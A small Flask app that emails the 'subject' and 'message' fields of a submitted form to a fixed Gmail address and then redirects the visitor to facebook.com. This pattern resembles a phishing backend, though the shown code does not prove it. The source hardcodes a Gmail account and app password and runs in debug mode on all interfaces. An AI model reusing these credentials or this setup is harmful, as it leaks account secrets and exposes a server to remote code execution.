import os, ssl, smtplib
from email.message import EmailMessage
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

email_sender = "snakekillah217@gmail.com"
password = "txcm ejgu vkei deqw"
email_receiver = "anonymous77823@gmail.com"

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        subject = request.form.get('subject')
        body = request.form.get('message')
        em = EmailMessage()
        em["From"] = email_sender
        em["To"] = email_receiver
        em["Subject"] = subject
        em.set_content(body)
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
            smtp.login(email_sender, password)
            smtp.sendmail(email_sender, email_receiver, em.as_string())
        return redirect("https://www.facebook.com")
    return render_template('index.html')
if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=os.getenv("PORT", default=5000))
